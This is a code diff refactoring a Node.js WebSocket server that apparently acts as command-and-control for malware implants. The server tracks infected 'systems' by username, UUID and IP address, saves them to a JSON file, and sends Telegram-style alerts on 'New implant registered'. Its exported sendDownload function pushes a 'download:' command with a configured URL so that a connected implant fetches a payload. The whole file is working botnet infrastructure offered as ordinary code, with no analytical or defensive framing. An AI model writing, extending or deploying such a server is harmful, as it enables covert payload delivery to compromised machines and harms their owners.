@@ -1,227 +1,232 @@
-const WebSocket = require("ws");
-const fs = require("fs").promises;
-const path = require("path");
-const { notifyLOG } = require("./bot.js");
-const config = require("./config.json");
+const WebSocket = require('ws');
+const fs = require('fs/promises');
+const path = require('path');
 
-const SYSTEMS_FILE = path.join(__dirname, "systems.json");
+const { notifyLOG } = require('./bot.js');
+const config = require('./config.json');
+
+const SYSTEMS_FILE = path.join(__dirname, 'systems.json');
 const PORT = 3010;
-const PATH = "/ws";
+const PATH = '/ws';
 
-const clients = new Map(); 
-let systems = {};
+const HEARTBEAT_INTERVAL = 35_000;  // how often we send pings
+const HEARTBEAT_TIMEOUT  = 50_000;  // must receive pong within this time
 
+const clients = new Map(); // username → WebSocket
+const systems = new Map(); // username → system metadata
 
-
+// ──────────────────────────────────────────────────────────────────────────────
+// Persistence
+// ──────────────────────────────────────────────────────────────────────────────
 
 async function loadSystems() {
   try {
-    const data = await fs.readFile(SYSTEMS_FILE, "utf8");
-    systems = JSON.parse(data);
+    const data = await fs.readFile(SYSTEMS_FILE, 'utf8');
+    const loaded = JSON.parse(data);
+    
+    for (const [username, info] of Object.entries(loaded)) {
+      systems.set(username, {
+        ...info,
+        active: false, // assume offline on server start
+        lastSeen: info.lastSeen || Date.now(),
+      });
+    }
+    
+    console.log(`[i] Loaded ${systems.size} known systems`);
   } catch (err) {
-    if (err.code === "ENOENT") {
-      systems = {};
+    if (err.code === 'ENOENT') {
+      console.log('[i] systems.json not found → starting clean');
     } else {
-      console.error("[!] Failed to load systems.json:", err.message);
-      systems = {};
+      console.error('[!] Failed to load systems.json:', err.message);
     }
   }
 }
 
 async function saveSystems() {
   try {
-    await fs.writeFile(
-      SYSTEMS_FILE,
-      JSON.stringify(systems, null, 2),
-      "utf8"
-    );
+    const data = Object.fromEntries(systems);
+    await fs.writeFile(SYSTEMS_FILE, JSON.stringify(data, null, 2), 'utf8');
   } catch (err) {
-    console.error("[!] Failed to save systems.json:", err.message);
+    console.error('[!] Failed to save systems.json:', err.message);
   }
 }
 
-loadSystems().then(() => {
-  console.log(`[*] Loaded ${Object.keys(systems).length} systems`);
-});
+// ──────────────────────────────────────────────────────────────────────────────
+// Cleanup helper
+// ──────────────────────────────────────────────────────────────────────────────
 
-const wss = new WebSocket.Server({ port: PORT, path: PATH });
-
-console.log(`[*] WebSocket server running on ws://localhost:${PORT}${PATH}`);
-
-const HEARTBEAT_INTERVAL = 35_000;
-const HEARTBEAT_TIMEOUT  = 45_000;  
-
-setInterval(() => {
-  const now = Date.now();
-  for (const [username, ws] of clients.entries()) {
-    if (now - ws.lastPongTime > HEARTBEAT_TIMEOUT) {
-      console.log(`[✗] Heartbeat timeout → killing ${username}`);
-      ws.terminate();
-      cleanupClient(username, "heartbeat_timeout");
-      continue;
-    }
-    ws.isAlive = false;
-    ws.ping();
-  }
-}, HEARTBEAT_INTERVAL);
-
-wss.on("connection", (ws, req) => {
-  console.log("[+] New client connected");
+function cleanupClient(username, reason = 'unknown') {
+  clients.delete(username);
   
-  let username = null;
-  ws.isAlive = true;
+  const system = systems.get(username);
+  if (system) {
+    system.active = false;
+    system.lastSeen = Date.now();
+    system.lastDisconnectReason = reason;
+  }
+  
+  console.log(`[-] ${username} cleaned up (${reason})`);
+  saveSystems().catch(() => {}); // don't block on save
+}
 
-  // Heartbeat handlers
-  ws.on("pong", () => {
+// ──────────────────────────────────────────────────────────────────────────────
+// Server startup
+// ──────────────────────────────────────────────────────────────────────────────
+
+loadSystems().then(() => {
+  const wss = new WebSocket.Server({ port: PORT, path: PATH });
+  
+  console.log(`[✓] WebSocket server started → ws://0.0.0.0:${PORT}${PATH}`);
+
+  // Heartbeat / zombie killer
+  setInterval(() => {
+    const now = Date.now();
+    
+    for (const [username, ws] of [...clients.entries()]) {
+      if (now - ws.lastPong > HEARTBEAT_TIMEOUT) {
+        console.log(`[✗] Heartbeat timeout → ${username}`);
+        ws.terminate();
+        cleanupClient(username, 'heartbeat_timeout');
+        continue;
+      }
+      
+      ws.isAlive = false;
+      ws.ping();
+    }
+  }, HEARTBEAT_INTERVAL);
+
+  wss.on('connection', (ws, req) => {
+    console.log('[+] New connection');
+
+    let username = null;
     ws.isAlive = true;
-  });
+    ws.lastPong = Date.now();
 
-  ws.on("message", async (message) => {
-    try {
-      const data = JSON.parse(message.toString());
+    ws.on('pong', () => {
+      ws.isAlive = true;
+      ws.lastPong = Date.now();
+    });
 
-      if (!data?.type) return;
+    ws.on('message', async (raw) => {
+      try {
+        const data = JSON.parse(raw.toString());
 
-      switch (data.type) {
-case "register": {
-  const candidate = (data.username ?? "").trim();
+        if (!data?.type) return;
 
-  if (!candidate || candidate.length < 3 || candidate.length > 64) {
-    ws.send(JSON.stringify({ error: "invalid_username" }));
-    ws.close(1008, "Username length must be 3–64 characters");
-    return;
-  }
-  if (clients.has(candidate) && clients.get(candidate) !== ws) {
-    ws.send(JSON.stringify({ error: "username_already_connected" }));
-    ws.close(1008, "Username already in use");
-    return;
-  }
+        switch (data.type) {
+          case 'register': {
+            const candidate = String(data.username ?? '').trim();
 
-          const newUsername = data.username.trim();
+            if (!candidate || candidate.length < 3 || candidate.length > 64) {
+              ws.send(JSON.stringify({ error: 'invalid_username' }));
+              ws.close(1008, 'Username must be 3–64 characters');
+              return;
+            }
 
-          // Prevent username takeover
-          if (clients.has(newUsername) && clients.get(newUsername) !== ws) {
-            ws.send(JSON.stringify({ error: "username_already_connected" }));
-            ws.close(1008, "Username already in use");
-            return;
+            // Prevent takeover / concurrent connections
+            if (clients.has(candidate) && clients.get(candidate) !== ws) {
+              ws.send(JSON.stringify({ error: 'username_taken' }));
+              ws.close(1008, 'Username already connected');
+              return;
+            }
+
+            // Clean previous connection if exists (rare race)
+            if (clients.has(candidate)) {
+              clients.get(candidate).terminate();
+            }
+
+            username = candidate;
+            clients.set(username, ws);
+
+            const now = Date.now();
+
+            if (!systems.has(username)) {
+              systems.set(username, {
+                uuid: data.uuid || 'unknown',
+                startTime: data.starttime || now,
+                firstSeen: now,
+                lastSeen: now,
+                active: true,
+                ip: req.socket.remoteAddress || 'unknown',
+                lastDisconnectReason: null,
+              });
+              console.log(`[+] New system registered → ${username}`);
+              notifyLOG?.(`New implant registered → ${username}`);
+            } else {
+              const sys = systems.get(username);
+              sys.active = true;
+              sys.lastSeen = now;
+              sys.lastDisconnectReason = null;
+              console.log(`[+] Reconnected → ${username}`);
+            }
+
+            await saveSystems();
+            break;
           }
 
-          username = newUsername;
-          clients.set(username, ws);
-
-          const now = Date.now();
-
-          if (!systems[username]) {
-            systems[username] = {
-              uuid: data.uuid || "unknown",
-              starttime: data.starttime || now,
-              active: true,
-              firstSeen: now,
-              lastSeen: now
-            };
-            console.log(`[+] New system registered: ${username}`);
-            notifyLOG?.(`❗️ New system registered → ${username}`);
-          } else {
-            systems[username].active = true;
-            systems[username].lastSeen = now;
-            console.log(`[+] System reconnected: ${username}`);
+          case 'ping': {
+            if (!username) return;
+            const sys = systems.get(username);
+            if (sys) {
+              sys.active = true;
+              sys.lastSeen = Date.now();
+            }
+            break;
           }
 
-          await saveSystems();
-          break;
+          default:
+            console.debug(`[?] Unknown type from ${username ?? 'unknown'}: ${data.type}`);
         }
-
-        case "ping": {
-          if (!username || !systems[username]) return;
-          
-          systems[username].active = true;
-          systems[username].lastSeen = Date.now();
-
-          break;
-        }
-
-        default:
-          console.debug(`[?] Unknown message type: ${data.type}`);
+      } catch (err) {
+        console.warn(`[!] Bad message from ${username ?? '?'} →`, err.message);
       }
-    } catch (err) {
-      console.warn("[!] Invalid message:", err.message);
-      // ws.send(JSON.stringify({ error: "invalid_message_format" })); // optional
-    }
-  });
+    });
 
-  ws.on("close", async (code, reason) => {
-    if (username) {
-    cleanupClient(username, `close_${code}${reason ? `_${reason}` : ""}`);
-  }
-    if (username && clients.get(username) === ws) {
-      clients.delete(username);
-
-      if (systems[username]) {
-        systems[username].active = false;
-        systems[username].lastSeen = Date.now();
-        await saveSystems();
+    ws.on('close', (code, reason) => {
+      if (username) {
+        cleanupClient(username, `close_${code}${reason ? `_${reason}` : ''}`);
+      } else {
+        console.log(`[-] Anonymous connection closed (code ${code})`);
       }
+    });
 
-      console.log(
-        `[-] ${username} disconnected ` +
-        `(code: ${code}${reason ? ` - ${reason}` : ""})`
-      );
-    }
-  });
-
-  ws.on("error", (err) => {
-    console.error(`[!] WebSocket error${username ? ` (${username})` : ""}:`, err.message);
+    ws.on('error', (err) => {
+      console.error(`[!] WS error ${username ? `(${username})` : ''}:`, err.message);
+    });
   });
 });
 
+// ──────────────────────────────────────────────────────────────────────────────
+// Public API
+// ──────────────────────────────────────────────────────────────────────────────
 
 async function sendDownload(username) {
   const ws = clients.get(username);
-  
   if (!ws) {
     console.warn(`[!] sendDownload: ${username} not connected`);
     return false;
   }
 
   if (ws.readyState !== WebSocket.OPEN) {
-    console.warn(`[!] sendDownload: ${username} websocket not OPEN (state: ${ws.readyState})`);
+    console.warn(`[!] sendDownload: ${username} not OPEN (state: ${ws.readyState})`);
     return false;
   }
 
   try {
     ws.send(`download:${config.downloadUrl}`);
-    console.log(`[>] Sent download command to ${username}`);
+    console.log(`[→] Download command sent to ${username}`);
     return true;
   } catch (err) {
-    console.error(`[!] Failed to send download to ${username}:`, err.message);
+    console.error(`[!] Failed sending download to ${username}:`, err.message);
     return false;
   }
-}
-
-
-function cleanupClient(username, reason = "unknown") {
-  clients.delete(username);
-  const system = systems.get(username);
-  if (system) {
-    system.active = false;
-    system.lastSeen = Date.now();
-    system.disconnectReason = reason;  // optional but very helpful for debugging
-  }
-  console.log(`[-] Cleaned up ${username} (${reason})`);
-  saveSystems();   // you can debounce this in production
 }
 
 module.exports = {
   clients,
   systems,
-  sendDownload
+  sendDownload,
+  // Bonus helpers you might want later:
+  // getOnlineCount: () => clients.size,
+  // isOnline: username => clients.has(username) && clients.get(username).readyState === WebSocket.OPEN,
 };
-
-
-
-
-
-
-
-
-
